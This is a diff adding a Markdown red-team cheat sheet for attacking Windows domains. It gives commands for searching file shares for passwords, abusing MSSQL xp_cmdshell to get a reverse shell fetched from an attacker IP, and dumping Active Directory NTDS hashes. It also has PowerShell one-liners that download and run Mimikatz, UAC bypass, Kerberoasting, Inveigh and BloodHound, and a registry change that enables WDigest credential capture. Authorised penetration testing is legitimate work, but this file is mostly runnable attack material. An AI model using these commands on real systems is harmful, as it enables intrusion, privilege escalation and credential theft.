@@ -1,0 +1,184 @@
+## File Shares (from Linux)
+
+Powerview Find-InterestingFile
+
+Plunder http://joshstone.us/plunder/
+
+CrackMapExec
+
+### Mount Windows Shares:
+```
+apt-get install -y cifs-utils
+mount -t cifs -o ro,domain=[domain],username=[username],password=[password],sec=ntlmv2 //hostnameOrIP/Share /path/to/localdir
+```
+
+-OR-
+
+```
+mount.cifs //172.16.42.52/C /root/share -o username=<user>
+```
+
+### Search file contents:
+
+`grep -irn --include \*.txt --include \*.doc --include \*.xls --include \*.xlsx passw`
+
+Search file names:
+
+`find . -iname "*passw*" | grep -e '\.txt$' -e '\.xlsx$' -e '\.xls$' -e '\.doc$'`
+
+## File Shares (from Windows)
+
+Lauch a cmd prompt as another user:
+
+`runas /netonly /user:[Domain]\[username] cmd.exe`
+
+Start PowerShell:
+
+```
+powershell -nop -exec bypass
+Import-Module [full path to PowerView.ps1]
+```
+
+Verify you have authenticated access:
+
+`Get-NetDomainControllers`
+
+Run Invoke-ShareFinder:
+
+`Invoke-ShareFinder -Verbose -HostList [./hostlist.txt] -ExcludeStandard -CheckShareAccess | Out-File -Encoding ASCII Found-Shares.txt`
+
+### Find Interesting Files:
+
+`Invoke-FileFinder [Optional: -ShareList shares.txt] -Terms [comma seperated terms] -OutFile interesting_files.csv`
+
+## Databases
+
+In addition to RDP'ing into a host to run MS database tools, you can use DBVisualizer (free) over sshuttle, Metasploit, and SQShell.
+
+### PowerUpSQL
+
+Lauch a cmd prompt as another user:
+
+`runas /netonly /user:[Domain]\[username] cmd.exe`
+
+Start PowerShell:
+
+```
+powershell -nop -exec bypass
+Import-Module [full path to PowerUpSQL.psd1]
+```
+
+Verify you have authenticated access:
+
+`Get-NetDomainControllers`
+
+### MSSQL Server Discovery:
+
+`Get-SQLInstanceDomain -Verbose`
+
+### Easy Server Auditing:
+
+`Invoke-SQLDumpInfo -Verbose -Instance "SQLServer1\STANDARDDEV2014"`
+
+... review output csv files.
+
+`Invoke-SQLAudit -Verbose -Instance "SQLServer1\STANDARDDEV2014"`
+
+### Automation:
+
+```
+$Servers = Get-SQLInstanceDomain –Verbose | Get-SQLConnectionTestThreaded –Verbose –Threads 10 | Where-Object {$_.Status –eq “Accessible”}
+$Servers | Get-SQLServerInfo –Verbose
+$Servers | Invoke-SQLAudit -Verbose
+```
+
+### Metasploit: auxiliary/admin/mssql/mssql_findandsampledata
+
+### SQShell: http://joshstone.us/sqshell/
+sqsh connect:
+
+`sqsh -S [Server IP] -U sa -P [password]`
+
+Execute commands:
+
+```
+xp_cmdshell 'whoami'
+go
+```
+
+Enable xp_cmdshell:
+
+```
+EXEC SP_CONFIGURE 'xp_cmdshell', 1
+reconfigure
+go
+```
+
+Rotten Potato
+
+`xp_cmdshell "whoami /priv"`
+
+Look for "SeImpersonatePrivilege
+
+Get a reverse shell (Use Nishang Invoke-PowerShellTcp.ps1):
+```
+xp_cmdshell "powershell IEX(New-Object Net.webclient).downloadString('http://[PTK IP]/[port]/[scriptname.ps1]')"
+go
+```
+
+## Dump Active Directory database (ntds) hashes
+
+`/opt/impacket/examples/secretsdump.py [Domain]/[username]@[DC FQDN] | tee /path/to/outputfile`
+
+-OR-
+
+`crackmapexec smb [IP] -u [username] -p [password] --ntds drsuapi`
+
+Output log of cme will be in /root/.cme/logs
+
+## SharePoint
+
+## CrackMapExec invoke_sessiongopher module
+
+
+## Collection of PowerShell one-liners for red teamers and penetration testers to use at various stages of testing.
+
+### Invoke-BypassUAC and start PowerShell prompt as Administrator [Or replace to run any other command]
+powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"
+
+### Invoke-Mimikatz: Dump credentials from memory
+powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
+
+### Import Mimikatz Module to run further commands
+powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"
+
+### Invoke-MassMimikatz: Use to dump creds on remote host [replace $env:computername with target server name(s)]
+powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'$env:COMPUTERNAME'|Invoke-MassMimikatz -Verbose"
+
+### PowerUp: Privilege escalation checks
+powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks”
+
+### Invoke-Inveigh and log output to file
+powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y"
+
+### Invoke-Kerberoast and provide Hashcat compatible hashes
+powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat"
+
+### Invoke-ShareFinder and print output to file
+powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"
+
+### Import PowerView Module to run further commands
+powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')"
+
+### Invoke-Bloodhound
+powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"
+
+### Find GPP Passwords in SYSVOL
+findstr /S cpassword $env:logonserver\sysvol\*.xml
+findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)
+
+### Run Powershell prompt as a different user, without loading profile to the machine [replace DOMAIN and USER]
+runas /user:DOMAIN\USER /noprofile powershell.exe
+
+### Insert reg key to enable Wdigest on newer versions of Windows
+reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1
